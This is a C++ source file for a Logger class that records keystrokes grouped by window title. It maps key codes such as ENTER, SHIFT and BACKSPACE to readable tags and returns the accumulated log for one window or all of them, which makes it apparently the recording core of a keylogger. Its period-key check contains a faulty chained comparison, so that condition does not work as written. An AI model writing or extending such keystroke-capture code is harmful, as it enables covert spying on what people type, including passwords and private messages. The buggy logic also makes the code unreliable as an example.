#include "pch.h"
#include "Logger.h"


// Insert(string, string) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, string key_input)
{
	this->_Log[window_name] += key_input;
	cout << window_name << " : " << this->_Log[window_name] << endl;
}

// Insert(string, int) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, int key_input)
{
	this->_Log[window_name] += key_input;
	cout << window_name << " : " << this->_Log[window_name] << endl;
}


// Add(string, int) : Add key stroke and the window name to Logger
void Logger::Add(string window_name, int key_stroke)
{
	// Check if key stroke is mapped if not map_key == "" 
	string map_key = _Keys.Map[key_stroke];

	// If key is not mapped
	if (map_key == "")
	{
		if(key_stroke == key_stroke == 190 || key_stroke == 110)
		{
			this->Insert(window_name, ".");
		}
		else
		{
			this->Insert(window_name, key_stroke);
		}
	}
	else
	{
		this->Insert(window_name, map_key);
	}

	/*
	if (key_stroke == VK_BACK)
	{
		this->Insert(window_name, "[BACKSPACE]");
	}
	else if(key_stroke == VK_RETURN)
	{
		this->Insert(window_name, "[ENTER]");
	}
	else if (key_stroke == VK_SPACE)
	{
		this->Insert(window_name, " ");
	}
	else if (key_stroke == VK_TAB)
	{
		this->Insert(window_name, "[TAB]");
	}
	else if (key_stroke == VK_SHIFT)
	{
		this->Insert(window_name, "[SHIFT]");
	}
	else if (key_stroke == VK_CONTROL)
	{
		this->Insert(window_name, "[CONTROL]");
	}
	else if (key_stroke == VK_ESCAPE)
	{
		this->Insert(window_name, "[ESCAPE]");
	}
	else if (key_stroke == VK_END)
	{
		this->Insert(window_name, "[END]");
	}
	else if (key_stroke == VK_HOME)
	{
		this->Insert(window_name, "[HOME]");
	}
	else if (key_stroke == VK_LEFT)
	{
		this->Insert(window_name, "[LEFT]");
	}
	else if (key_stroke == VK_UP)
	{
		this->Insert(window_name, "[UP]");
	}
	else if (key_stroke == VK_RIGHT)
	{
		this->Insert(window_name, "[RIGHT]");
	}
	else if (key_stroke == VK_DOWN)
	{
		this->Insert(window_name, "[DOWN]");
	}
	else if (key_stroke == key_stroke == 190 || key_stroke == 110)
	{
		this->Insert(window_name, ".");
	}
	else
	{
		this->Insert(window_name, key_stroke);
	}
	*/
}

// GetLog(string) : Return the key log for a specific window
string Logger::GetLog(string window_name) 
{
	return this->_Log.find(window_name)->second;
}

// GetLog(string) : Return all the key log for all window
string Logger::GetLog()
{
	string log = "";

	// Go through all the log
	for (map<string, string>::iterator iter = _Log.begin(); iter != _Log.end(); ++iter)
	{
		log += iter->first + " > " + iter->second;
	}

	return log;
}